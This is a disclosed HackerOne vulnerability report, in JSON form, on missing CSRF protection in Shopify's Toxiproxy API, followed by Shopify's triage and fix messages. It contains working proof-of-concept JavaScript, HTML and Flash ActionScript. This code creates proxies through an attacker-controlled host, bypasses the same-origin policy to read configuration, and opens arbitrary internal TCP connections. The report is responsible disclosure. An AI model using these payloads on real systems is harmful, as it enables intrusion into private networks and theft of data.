{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-07-11T20:32:48.265Z", 
    "voters": [
        "spam404", 
        "eveeez", 
        "babayaga_", 
        "cryptographer", 
        "zackyrest06"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 236349, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-07-01T20:09:30.871Z", 
    "vulnerability_information": "# Disclaimer\nIn case this report ever becomes public I wanted to start it out with a disclaimer so it doesn't become referenced an example for out-of-scope/policy violating submissions in the future:\n\n* At the time of submission this report is out-of-scope and as such I have no expectations of reward.\n* At no point was this ever tested against Shopify infrastructure, all testing was completed locally and the potential abuse vectors are theoretical at best.\n* The impact of this report is highly dependent on the architecture of the internal network at Shopify, without knowledge of the internal layout I can only speculate on impact.\n* This issue was reported privately via HackerOne (instead of a public GitHub issue) so the Shopify team could choose how to handle the report. I fully respect any decision they make regarding fixing this issue or leaving it as is to not break existing functionality. \n\n# Background\nIn [early 2015](https://engineering.shopify.com/blogs/engineering/building-and-testing-resilient-ruby-on-rails-applications?utm_campaign=Feed%3A%20Sirupsen%20%28Sirupsen%29&utm_medium=feed&utm_source=feedburner) the Shopify engineering team [open-sourced](https://github.com/Shopify/toxiproxy) a tool called \"Toxiproxy\". The tool is designed to simulate chaotic network conditions by proxying TCP traffic to help understand and test how an application behaves under extreme load or other error conditions caused by network issues. The tool works by exposing a [HTTP API](https://github.com/Shopify/toxiproxy#http-api) which is bound to port `8474` on the loopback interface (by default, this is customizable). The API allows clients to start and stop new proxies as well as start and stop [toxics](https://github.com/Shopify/toxiproxy#toxics) to simulate error conditions for each proxy. The tool can be installed from the [Shopify HomeBrew tap](https://github.com/Shopify/homebrew-shopify) on macOS as well as well as from [pre-compiled binaries](https://github.com/Shopify/toxiproxy/releases) on other platforms. For this report it is assumed that the tool has already been installed and the service configured to run in the background (as suggested in [the documentation](https://github.com/Shopify/homebrew-shopify/blob/master/toxiproxy.rb#L28)). See the \"Environment Setup\" section for more details.\n\n# Description\nThe [HTTP API](https://github.com/Shopify/toxiproxy#http-api) for toxiproxy does not have any CSRF protections. This allows a malicious webpage to configure, start, and modify arbitrary proxies. By exploiting [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy) and Adobe Flash [socket policy files](http://www.adobe.com/devnet/flashplayer/articles/socket_policy_files.html) a malicious webpage can abuse this CSRF make arbitrary TCP connections (including HTTP connections) within the internal network of a toxiproxy user. This could be used to exfiltrate data from systems which are not exposed to the internet but are accessible by the victim. Please note the attacker would not gain access to the victim's existing authenticated sessions and as such could only use this issue to access systems which are protected solely by IP whitelists or have weak/no authentication. A number of PoCs can be found below...\n\n\n# Impact\nIf a Shopify employee who has toxiproxy installed clicks a malicious link a malicious actor can gain access to the internal network of Shopify with the ability to read/write arbitrary TCP connections within the network. Additionally, because DNS resolution is done by the toxiproxy server the attacker may not even need to map the internal network ahead of time, they could provide internal hostnames and they will be faithfully resolved by the internal split-DNS provider. The impact of this access is highly dependent on what systems are accessible without authentication (or with weak auth) within the Shopify internal network, I'll choose not to speculate there and let the Shopify team better assess the impact.\n\n# Remediation\nThe API should implement some form of CSRF protection, ideally by just placing the entire API behind authentication.\n\n\n# Environment Setup\nAll exploits described in this report were tested on `macOS Sierra 10.12.3 (16D32)` against `toxiproxy v2.1.1` (latest at the time of submission) which was installed as follows:\n\n``` \n$ brew update\n\t[snip]\n$ brew install toxiproxy\n\t==> Installing toxiproxy from shopify/shopify\n\t==> Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-server\n\tAlready downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy-2.1.1\n\t==> Downloading https://github.com/Shopify/toxiproxy/releases/download/v2.1.1/toxiproxy-cli-da\n\tAlready downloaded: /Users/luke/Library/Caches/Homebrew/toxiproxy--cli-2.1.1\n\t==> Caveats\n\tTo have launchd start shopify/shopify/toxiproxy now and restart at login:\n\t  brew services start shopify/shopify/toxiproxy\n\tOr, if you don't want/need a background service you can just run:\n\t  toxiproxy\n\t==> Summary\n\t\ud83c\udf7a  /usr/local/Cellar/toxiproxy/2.1.1: 5 files, 13.4MB, built in 1 second\n$ brew services start shopify/shopify/toxiproxy\n\t==> Successfully started `toxiproxy` (label: homebrew.mxcl.toxiproxy)\n```\n\nA number of servers have been setup on [toxiproxy.attackerdoma.in](http://toxiproxy.attackerdoma.in) to facilitate the PoCs, the source code for these can be found at the following private gist: [gist.github.com/bored-engineer/50aa6591f307d51c28b4be71dd80f8a9](https://gist.github.com/bored-engineer/50aa6591f307d51c28b4be71dd80f8a9). Please note that these are servers are hosted on ephemeral instance and likely will not remain online after the report has been triaged and resolved. \n\n# PoC - Create a new proxy\nDemonstrating the issue is fundamentally pretty simple and can be done as follows...\n\nPoC available at: [attackerdoma.in/7c9e1586-ab53-48d7-9704-165865a90ab1.html](http://attackerdoma.in/7c9e1586-ab53-48d7-9704-165865a90ab1.html)\n\n```js\nfetch(\"http://localhost:8474/proxies\", {\n\tmethod: \"POST\",\n\tmode: \"no-cors\",\n\tbody: JSON.stringify({\n\t\tname: \"csrf\",\n\t\tlisten: \"0.0.0.0:2773\",\n\t\tupstream: \"toxiproxy.attackerdoma.in:12773\",\n\t\tenabled: true\n\t}),\n});\n```\n\nYou can verify the PoC worked correctly by either accessing the new proxy at [http://127.0.0.1:2773/1efb54c5](http://127.0.0.1:2773/1efb54c5) or via the [toxiproxy-cli](https://github.com/Shopify/toxiproxy#cli-example):\n\n```\n$ toxiproxy-cli inspect csrf\nName: csrf\tListen: 127.0.0.1:2773\tUpstream: toxiproxy.attackerdoma.in:2773\n======================================================================\nProxy has no toxics enabled.\n```\n\n# PoC - Bypass SOP to read current state\nWhile we can CSRF the creation of proxies, we cannot read the current toxiproxy state which could contain useful information for an attacker as it is blocked by [SOP](https://en.wikipedia.org/wiki/Same-origin_policy). We can bypass this restriction by executing the following steps:\n\n1. CSRF create a new `pivot` proxy pointing to `http://attackerdoma.in:17486`\n2. Redirect the webpage to the new `pivot` proxy\n3. From the new webpage use the CSRF to change the upstream for the `pivot` proxy to point to `http://127.0.0.1:8474` (the toxiproxy HTTP API)\n4. Make a XHR request to read the configuration (because the browser believes it is still communicating with the same origin, this is allowed)\n\n\nPoC available at: [attackerdoma.in/a10f2786-7149-43e8-8a90-b3fa46caafd5.html](http://attackerdoma.in/a10f2786-7149-43e8-8a90-b3fa46caafd5.html)\n\nThe PoC for this consists of two stages...\n\n```js\n// Get the instance we are exploiting\nlet toxiproxy = new URL(prompt(\"Enter the URL of the toxiproxy instance you would like to CSRF:\", \"http://localhost:8474\"));\ntoxiproxy.pathname = \"proxies\";\n// CSRF creation of the proxy\nfetch(toxiproxy.toString(), {\n\tmethod: \"POST\",\n\tmode: \"no-cors\",\n\tbody: JSON.stringify({\n\t\tname: \"pivot\",\n\t\tlisten: \"0.0.0.0:7486\",\n\t\tupstream: \"toxiproxy.attackerdoma.in:17486\",\n\t\tenabled: true\n\t}),\n}).then(() => {\n\t// There is a chance the \"pivot\" proxy already exists, if so modify it instead\n\ttoxiproxy.pathname = \"proxies/pivot\"\n\treturn fetch(toxiproxy.toString(), {\n\t\tmethod: \"POST\",\n\t\tmode: \"no-cors\",\n\t\tbody: JSON.stringify({\n\t\t\tname: \"pivot\",\n\t\t\tlisten: \"0.0.0.0:7486\",\n\t\t\tupstream: \"toxiproxy.attackerdoma.in:17486\",\n\t\t\tenabled: true\n\t\t}),\n\t})\n}).then(() => {\n\t// Redirect to the PoC, passing the toxiproxy URL used (in-case it was custom)\n\tlet pivotproxy = new URL(toxiproxy);\n\tpivotproxy.port = 7486;\n\tpivotproxy.pathname = \"3450b92c\";\n\tpivotproxy.hash = \"#\" + toxiproxy.toString();\n\twindow.location.href = pivotproxy.toString();\n});\n```\nFollowed by the second stage:\n\n```js\n// CSRF the proxy to point to it's own HTTP interface\nlet toxiproxy = new URL(window.location.hash.substring(1));\ntoxiproxy.pathname = \"/proxies/pivot\";\nfetch(toxiproxy.toString(), {\n\tmethod: \"POST\",\n\tmode: \"no-cors\",\n\tbody: JSON.stringify({\n\t\tname: \"pivot\",\n\t\tlisten: \"0.0.0.0:7486\",\n\t\tupstream: toxiproxy.host,\n\t\tenabled: true\n\t}),\n}).then(() => {\n\t// Fetch the list of proxies from ourself (allows because it's same-origin)\n\tlet self = new URL(window.location.href);\n\tself.pathname = \"/proxies\";\n\treturn fetch(self.toString(), {\n\t\tmethod: \"GET\",\n\t})\n}).then((r) => r.json()).then((conf) => {\n\tdocument.write(\"<pre>Exfiltrated the following toxiproxy configuration:\\n\" + JSON.stringify(conf, null, 2) + \"</pre>\");\n});\n```\n# PoC - Connect to arbitrary hosts and read/write arbitrary TCP data\nWhile reading and writing HTTP traffic is fun, the holy grail of internal network access is the ability to read/write arbitrary TCP traffic. This is actually possible due to Adobe Flash. Flash has had the ability to read/write raw TCP sockets for a number of years however it requires that the TCP server it connects to respond with a [socket policy file](http://www.adobe.com/devnet/flashplayer/articles/socket_policy_files.html) when requested. Thankfully, per the documentation, once flash has received permission it will cache it indefinitely (per IP/port pair):\n\n> Once Flash Player receives permission, it will remember the result for the lifetime of the SWF file. Flash Player associates each socket policy file to an IP address, and it needs a policy file for each connection to a new IP address. For instance, assume that the developer specifies a hostname for the connection and that a DNS lookup returns multiple IP addresses. Every time the IP address changes for the hostname, Flash Player will check the new IP address for a socket policy file. This helps to protect against DNS rebinding attacks.\n\nBy using a similar technique as the previous PoC we can swap out the upstream proxy once this permission has been granted and cached, allowing us to read/write arbitrary TCP traffic within the network. The attack looks like this:\n\n1. Load a specially crafted SWF file which we will use to send the data\n2. CSRF create a new `policy` proxy pointing to `attackerdoma.in:17654`\n2. Trigger the SWF to open a socket to the `policy` proxy which will grant full permissions (and be cached for the lifetime of the SWF) \n3. Use the CSRF to change the upstream for the `pivot` proxy to point to our target TCP address.\n4. Make arbitrary TCP connections from the SWF\n\nThe PoC for this consists of two parts...\nPoC available at: [attackerdoma.in/0761bfa0-b69a-436b-a474-c67b04157abd.html](http://attackerdoma.in/0761bfa0-b69a-436b-a474-c67b04157abd.html)\n\nThe ActionScript for the SWF file is as follows (compiled with the Adobe Flex SDK 4.6):\n\n```actionscript\npackage {\n\timport flash.display.Sprite;\n\timport flash.net.Socket;\n\timport flash.system.Security;\n\timport flash.events.*;\n\timport flash.external.ExternalInterface;\n\n\tpublic class Main extends Sprite {\n\n\t\tpublic function Main() {\n\t\t\tSecurity.allowDomain(\"*\");\n\t\t\tSecurity.allowInsecureDomain(\"*\");\n\t\t\tExternalInterface.addCallback(\"connect\", connect);\n\t\t\tExternalInterface.call(\"onready\");\n\t\t}\n\n\t\tpublic function dataHandler(event:ProgressEvent):void { \n\t\t\tvar socket:Socket = event.target as Socket;\n\t\t\tvar msg:String = socket.readUTFBytes(socket.bytesAvailable); \n\t\t\tExternalInterface.call(\"onsocketdata\", escape(msg));\n\t\t}\n\n\t\tpublic function closeHandler(event:Event):void { \n\t\t\tExternalInterface.call(\"onsocketclose\");\n\t\t}\n\n\t\tpublic function connect(host:String, port:int, msg:String):String {\n\t\t\tvar socket:Socket;\n\t\t\tsocket = new Socket();\n\t\t\ttry {\n\t\t\t\tsocket.connect(host, port);\n\t\t\t\tsocket.writeUTFBytes(msg); \n\t\t\t\tsocket.addEventListener(Event.CLOSE, closeHandler);\n\t\t\t\tsocket.addEventListener(ProgressEvent.SOCKET_DATA, dataHandler); \n\t\t\t\tsocket.flush(); \n\t\t\t} catch (error:Error) { \n\t\t\t\tsocket.close(); \n\t\t\t\treturn error.message;\n\t\t\t} \n\t\t\treturn \"\";\n\t\t}\n\t}\n}\n```\nThe HTML/JS for the PoC is as follows:\n\n```html\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<script>\n\t\t\t// Called by flash once loaded\n\t\t\tfunction onready() {\n\t\t\t\t// Get access to the flash objects\n\t\t\t\tlet flash = document.getElementById(\"flash\");\n\t\t\t\t// Get the instance we are exploiting\n\t\t\t\tlet toxiproxy = new URL(prompt(\"Enter the URL of the toxiproxy instance you would like to CSRF:\", \"http://localhost:8474\"));\n\t\t\t\ttoxiproxy.pathname = \"proxies\";\n\t\t\t\t// CSRF creation of the proxy\n\t\t\t\tfetch(toxiproxy.toString(), {\n\t\t\t\t\tmethod: \"POST\",\n\t\t\t\t\tmode: \"no-cors\",\n\t\t\t\t\tbody: JSON.stringify({\n\t\t\t\t\t\tname: \"policy\",\n\t\t\t\t\t\tlisten: \"0.0.0.0:7654\",\n\t\t\t\t\t\tupstream: \"toxiproxy.attackerdoma.in:17654\",\n\t\t\t\t\t\tenabled: true\n\t\t\t\t\t}),\n\t\t\t\t}).then(() => {\n\t\t\t\t\t// There is a chance the \"policy\" proxy already exists, if so modify it instead\n\t\t\t\t\ttoxiproxy.pathname = \"proxies/policy\"\n\t\t\t\t\treturn fetch(toxiproxy.toString(), {\n\t\t\t\t\t\tmethod: \"POST\",\n\t\t\t\t\t\tmode: \"no-cors\",\n\t\t\t\t\t\tbody: JSON.stringify({\n\t\t\t\t\t\t\tname: \"policy\",\n\t\t\t\t\t\t\tlisten: \"0.0.0.0:7654\",\n\t\t\t\t\t\t\tupstream: \"toxiproxy.attackerdoma.in:17654\",\n\t\t\t\t\t\t\tenabled: true\n\t\t\t\t\t\t}),\n\t\t\t\t\t});\n\t\t\t\t}).then(() => {\n\t\t\t\t\t// Once the socket has connected the first time our policy is cached\n\t\t\t\t\twindow.onsocketclose = () => {\n\t\t\t\t\t\t// Change the proxy to point to the target\n\t\t\t\t\t\tlet target = new URL(\"http://\" + prompt(\"Enter the TCP host/ip pair you would like to connect to:\", \"localhost:9999\"));\n\t\t\t\t\t\tfetch(toxiproxy.toString(), {\n\t\t\t\t\t\t\tmethod: \"POST\",\n\t\t\t\t\t\t\tmode: \"no-cors\",\n\t\t\t\t\t\t\tbody: JSON.stringify({\n\t\t\t\t\t\t\t\tname: \"policy\",\n\t\t\t\t\t\t\t\tlisten: \"0.0.0.0:7654\",\n\t\t\t\t\t\t\t\tupstream: target.host,\n\t\t\t\t\t\t\t\tenabled: true\n\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t}).then(() => {\n\t\t\t\t\t\t\tlet data = prompt(\"Enter the data you would like to send:\", \"Hello World\");\n\t\t\t\t\t\t\tlet response = \"\";\n\t\t\t\t\t\t\twindow.onsocketdata = (socketData) => {\n\t\t\t\t\t\t\t\tresponse += socketData;\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\twindow.onsocketclose = () => {\n\t\t\t\t\t\t\t\tdocument.write(`<pre>Got Response:\\n${response}</pre>`);\n\t\t\t\t\t\t\t};\n\t\t\t\t\t\t\tflash.connect(toxiproxy.hostname, 7654, data);\n\t\t\t\t\t\t});\n\t\t\t\t\t};\n\t\t\t\t\t// Trigger the first cache\n\t\t\t\t\tconsole.log(flash)\n\t\t\t\t\tflash.connect(toxiproxy.hostname, 7654, \"cache\");\n\t\t\t\t});\n\t\t\t}\n\t\t</script>\n\t</head>\n\t<body>\n\t\t<object id=\"flash\" name=\"flash\" type=\"application/x-shockwave-flash\" data=\"10495ef1-3be0-49b2-8872-2f09e29ad848.swf\">\n\t\t    <param name=\"movie\" value=\"10495ef1-3be0-49b2-8872-2f09e29ad848.swf\" />\n\t\t    <param name=\"AllowScriptAccess\" value=\"always\" />\n\t\t</object>\n\t</body>\n</html>\n```\n\n# Postscript\nI know this was a rather long report, and it's fundamentally a pretty simple issue, however it's a rather unique issue once you get into exploitation and I had a lot of fun working on it, I hope you guys enjoy it too.", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "medium", 
        "author_type": "User"
    }, 
    "title": "[out-of-scope] toxiproxy: Lack of CSRF protection allows an attacker to gain access to internal Shopify network", 
    "is_member_of_team?": null, 
    "vote_count": 5, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": true, 
            "created_at": "2017-06-04T04:15:23.521Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-04T04:15:23.521Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nOur team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!\n\nWhile you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!", 
            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Our team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don&#39;t worry, we&#39;ll get to yours!</p>\n\n<p>While you are waiting, you can read over our list of non applicable issues listed on our program page: <a title=\"https://hackerone.com/shopify\" href=\"https://hackerone.com/shopify\">https://hackerone.com/shopify</a>. Make sure your issue isn&#39;t listed!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1728603, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-05T20:22:16.954Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-05T20:23:20.590Z", 
            "actor": {
                "username": "jack_mccracken", 
                "url": "/jack_mccracken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hey!\n\nThanks so much for reporting this issue. We've taken a look and are going to try and take some steps to mitigate its impact. As you mentioned ToxiProxy is not within the scope of the Shopify bug bounty program so there likely won't be a bug bounty payout for this issue.", 
            "markdown_message": "<p>Hey!</p>\n\n<p>Thanks so much for reporting this issue. We&#39;ve taken a look and are going to try and take some steps to mitigate its impact. As you mentioned ToxiProxy is not within the scope of the Shopify bug bounty program so there likely won&#39;t be a bug bounty payout for this issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1732250, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bored-engineer", 
                "url": "/bored-engineer"
            }, 
            "created_at": "2017-06-27T13:44:01.930Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T13:44:01.930Z", 
            "actor": {
                "username": "jack_mccracken", 
                "url": "/jack_mccracken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hey there!\n\nWe have introduced a fix to Toxiproxy which should be shipping out soon. Here's the PR: https://github.com/Shopify/toxiproxy/pull/184", 
            "markdown_message": "<p>Hey there!</p>\n\n<p>We have introduced a fix to Toxiproxy which should be shipping out soon. Here&#39;s the PR: <a title=\"https://github.com/Shopify/toxiproxy/pull/184\" href=\"/redirect?signature=e286bc32b3b61b7ae0ab55c198c69a02cef2cf04&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%2Fpull%2F184\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Shopify/toxiproxy/pull/184</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1784384, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-27T17:52:22.770Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T17:52:22.770Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 1785195, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-01T20:09:30.946Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-01T20:09:30.946Z", 
            "actor": {
                "username": "jack_mccracken", 
                "url": "/jack_mccracken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/164/342/d84663e45cc32643d2cf593fcc17d1b5db05255e_medium.jpeg?1495044147"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2969054, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-11T20:32:48.293Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-11T20:32:48.293Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 3032202, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-11T20:32:48.364Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-11T20:32:48.364Z", 
            "actor": {
                "username": "bored-engineer", 
                "url": "/bored-engineer", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3032203, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "bored-engineer", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bored-engineer", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/328/369436c6c39c8338c3bd3c96466f58fd2b4bee1d_small.png?1467257466"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 68, 
        "name": "Server-Side Request Forgery (SSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-07-11T20:32:48.335Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/236349", 
    "created_at": "2017-06-04T04:15:23.236Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"disclaimer\">Disclaimer</h1>\n\n<p>In case this report ever becomes public I wanted to start it out with a disclaimer so it doesn&#39;t become referenced an example for out-of-scope/policy violating submissions in the future:</p>\n\n<ul>\n<li>At the time of submission this report is out-of-scope and as such I have no expectations of reward.</li>\n<li>At no point was this ever tested against Shopify infrastructure, all testing was completed locally and the potential abuse vectors are theoretical at best.</li>\n<li>The impact of this report is highly dependent on the architecture of the internal network at Shopify, without knowledge of the internal layout I can only speculate on impact.</li>\n<li>This issue was reported privately via HackerOne (instead of a public GitHub issue) so the Shopify team could choose how to handle the report. I fully respect any decision they make regarding fixing this issue or leaving it as is to not break existing functionality. </li>\n</ul>\n\n<h1 id=\"background\">Background</h1>\n\n<p>In <a href=\"/redirect?signature=10bcc24225b08d6aeffb239b2f7828da380156cf&amp;url=https%3A%2F%2Fengineering.shopify.com%2Fblogs%2Fengineering%2Fbuilding-and-testing-resilient-ruby-on-rails-applications%3Futm_campaign%3DFeed%253A%2520Sirupsen%2520%2528Sirupsen%2529%26utm_medium%3Dfeed%26utm_source%3Dfeedburner\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>early 2015</span><i class=\"icon-external-link\"></i></a> the Shopify engineering team <a href=\"/redirect?signature=095395ad19996ada746b275d24b54c04d8d49756&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>open-sourced</span><i class=\"icon-external-link\"></i></a> a tool called &quot;Toxiproxy&quot;. The tool is designed to simulate chaotic network conditions by proxying TCP traffic to help understand and test how an application behaves under extreme load or other error conditions caused by network issues. The tool works by exposing a <a href=\"/redirect?signature=2d3657048bab83b7586a16e4daae42430d0fc06e&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%23http-api\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>HTTP API</span><i class=\"icon-external-link\"></i></a> which is bound to port <code>8474</code> on the loopback interface (by default, this is customizable). The API allows clients to start and stop new proxies as well as start and stop <a href=\"/redirect?signature=fa57691d334543e7c7e7194aeb0c0c22c5ec210c&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%23toxics\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>toxics</span><i class=\"icon-external-link\"></i></a> to simulate error conditions for each proxy. The tool can be installed from the <a href=\"/redirect?signature=718b2823e78f6d441807586ab3ac94fc85315ff8&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Fhomebrew-shopify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Shopify HomeBrew tap</span><i class=\"icon-external-link\"></i></a> on macOS as well as well as from <a href=\"/redirect?signature=26383dcb2428287a1f8a019fa02da5928c9592cc&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%2Freleases\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>pre-compiled binaries</span><i class=\"icon-external-link\"></i></a> on other platforms. For this report it is assumed that the tool has already been installed and the service configured to run in the background (as suggested in <a href=\"/redirect?signature=cb911c0b765087024e635e45cab08f92fdaa9691&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Fhomebrew-shopify%2Fblob%2Fmaster%2Ftoxiproxy.rb%23L28\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>the documentation</span><i class=\"icon-external-link\"></i></a>). See the &quot;Environment Setup&quot; section for more details.</p>\n\n<h1 id=\"description\">Description</h1>\n\n<p>The <a href=\"/redirect?signature=2d3657048bab83b7586a16e4daae42430d0fc06e&amp;url=https%3A%2F%2Fgithub.com%2FShopify%2Ftoxiproxy%23http-api\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>HTTP API</span><i class=\"icon-external-link\"></i></a> for toxiproxy does not have any CSRF protections. This allows a malicious webpage to configure, start, and modify arbitrary proxies. By exploiting <a href=\"/redirect?signature=a73778c0baec7060bf2f6780af217ad93f4685b0&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSame-origin_policy\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>same-origin policy</span><i class=\"icon-external-link\"></i></a> and Adobe Flash <a href=\"/redirect?signature=05ad180beb9d1c7abcb9ed71ff1c81773d03554b&amp;url=http%3A%2F%2Fwww.adobe.com%2Fdevnet%2Fflashplayer%2Farticles%2Fsocket_policy_files.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>socket policy files</span><i class=\"icon-external-link\"></i></a> a malicious webpage can abuse this CSRF make arbitrary TCP connections (including HTTP connections) within the internal network of a toxiproxy user. This could be used to exfiltrate data from systems which are not exposed to the internet but are accessible by the victim. Please note the attacker would not gain access to the victim&#39;s existing authenticated sessions and as such could only use this issue to access systems which are protected solely by IP whitelists or have weak/no authentication. A number of PoCs can be found below...</p>\n\n<h1 id=\"impact\">Impact</h1>\n\n<p>If a Shopify employee who has toxiproxy installed clicks a malicious link a malicious actor can gain access to the internal network of Shopify with the ability to read/write arbitrary TCP connections within the network. Additionally, because DNS resolution is done by the toxiproxy server the attacker may not even need to map the internal network ahead of time, they could provide internal hostnames and they will be faithfully resolved by the internal 